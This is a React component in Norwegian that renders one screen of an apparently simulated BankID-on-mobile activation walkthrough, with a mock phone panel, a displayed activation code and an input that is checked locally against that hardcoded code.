import { useEffect, useRef, useState } from 'react';
import { useDispatch, useSelector } from 'react-redux';
import { setScreen, setError } from './../../redux/actions/activeBankIdAction';
import Loader from './../loader';

const ScreenFifth = () => {
  const containerRef = useRef();
  const sidePanel = useRef();
  const [step, setStep] = useState(1);
  const { screen, error } = useSelector((state) => state.activeBankId);

  const dispatch = useDispatch();

  useEffect(() => {
    const containerAnimation = new Promise((resolve, reject) => {
      if (containerRef.current !== null) {
        containerRef.current.style.maxWidth = '1215px';
        setTimeout(() => {
          resolve(true);
        }, 500);
      }
    });
    containerAnimation.then(() => {
      if (sidePanel.current !== null) {
        sidePanel.current.classList.remove('hidden');
        setTimeout(() => {
          sidePanel.current.style.opacity = 1;
        }, 50);
      }
    });
  }, []);

  const submitHandle = (e) => {
    e.preventDefault();

    setStep(2);
    dispatch(setError(false));
  };
  const handleBack = () => {
    sidePanel.current.style.opacity = 0;
    setTimeout(() => {
      sidePanel.current.classList.add('hidden');
      containerRef.current.style.maxWidth = '790px';
      dispatch(setScreen(screen - 1));
    }, 400);
  };
  const pinID = 86548632;
  const sendHandle = (e) => {
    e.preventDefault();
    const pinIdVal = e.target.pinId;
    if (pinIdVal.value === '' || pinID !== parseInt(pinIdVal.value)) {
      dispatch(setError('Skriv inn riktig kode.'));
      return;
    }
    dispatch(setError(false));
    dispatch(setScreen(screen + 1));
  };

  return (
    <div className="container max-w-[791px] flex my-6 space-x-6 transition duration-500 transition-max-width" ref={containerRef}>
      <div className="lg:w-[800px] bg-white px-10 py-10 shadow-md">
        <h1 className="mb-6">Bestill BankID på mobil</h1>

        <div className="border border-gray-300 px-7 py-10 min-h-[200px] mb-5">
          {step === 1 && (
            <>
              <h2 className="text-2xl font-medium mb-3">Klar til aktivering</h2>
              <p className="max-w-xs pb-7">
                Du er nå klar til å fortsette aktiveringen på mobiltelefonen. Klikk på “fortsett” og følg anvisningene nøye.
              </p>
              <p className="max-w-xs pb-3">Aktiveringsprosessen kan ta 2-3 minutter.</p>

              <div className="w-32 text-center">
                <button
                  type="button"
                  className="rounded-md bg-primary p-3 text-white font-anenirHeavy text-xl uppercase focus:outline-none hover:bg-pink hover:text-black transition w-full"
                  onClick={submitHandle}
                >
                  Fortsett
                </button>
                <span className="block text-xl my-4">eller</span>
                <button
                  type="button"
                  className="bg-white p-3 rounded-lg border border-black uppercase text-xl font-anenirHeavy text-black transition w-32 text-center hover:bg-pink block focus:outline-none"
                  onClick={handleBack}
                >
                  Avbryt
                </button>
              </div>
            </>
          )}
          {step === 2 && <h2 className="text-xl font-medium mb-3">Følg anvisningen på mobiltelefonen til høyre.</h2>}
          {step === 3 && (
            <>
              <h2 className="text-xl font-medium">Følg anvisningen på mobiltelefonen til høyre.</h2>
              <div className="text-2rem text-primary uppercase font-anenirHeavy my-2">{pinID}</div>
              <h2 className="text-xl font-medium">Følg anvisninger mobiltelefonen til høyre.</h2>
            </>
          )}
        </div>
      </div>
      <div className="border border-secondary bg-[#CEEBF5] p-[40px] w-[325px] relative hidden opacity-0 transition duration-300" ref={sidePanel}>
        <div className="h-full w-full flex flex-col justify-center items-center">
          <div className="w-[204px] relative">
            <img src={require('./../../img/mobile.png')} className="w-full" alt="" />
            {step === 1 && <Loader />}
            {step === 2 && (
              <div className="absolute top-0 left-0 bottom-0 right-0 text-center p-5 flex justify-center items-center flex-col">
                <p className="text-white">Du skal nå velge din personlige PIN-kode for BankID på mobil (4-8 siffer). Bekreft for å gå videre.</p>
                <div className="flex flex-col mt-14">
                  <button className="bg-none border-0 focus:outline-none text-base font-anenirHeavy text-[#FEC8AF]" onClick={() => setStep(step + 1)}>
                    Bekreft
                  </button>
                  <button
                    className="bg-none border-0 focus:outline-none text-base font-anenirHeavy text-[#FEC8AF] ml-auto focus:outline-none mt-5"
                    onClick={() => setStep(step - 1)}
                  >
                    Avbryt
                  </button>
                </div>
              </div>
            )}
            {step === 3 && (
              <div className="absolute top-0 left-0 bottom-0 right-0 text-center p-5 flex justify-center items-center flex-col">
                <p className="text-white">Tast inn aktiveringskoden du har fått oppgitt i nettbanken:</p>
                <div className="flex flex-col mt-10">
                  <form onSubmit={sendHandle}>
                    <label className="text-white block">Tast inn kode (8 sifre)</label>
                    <input
                      type="number"
                      name="pinId"
                      className="number-field focus:outline-none bg-white w-full h-14 my-3 p-3 text-center text-black text-xl"
                    ></input>
                    {error && <div className="text-white text-sm mb-2 bg-red-600 p-2">{error}</div>}
                    <button className="bg-none border-0 focus:outline-none text-base font-anenirHeavy text-[#FEC8AF]" type="submit">
                      Send
                    </button>
                  </form>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default ScreenFifth;
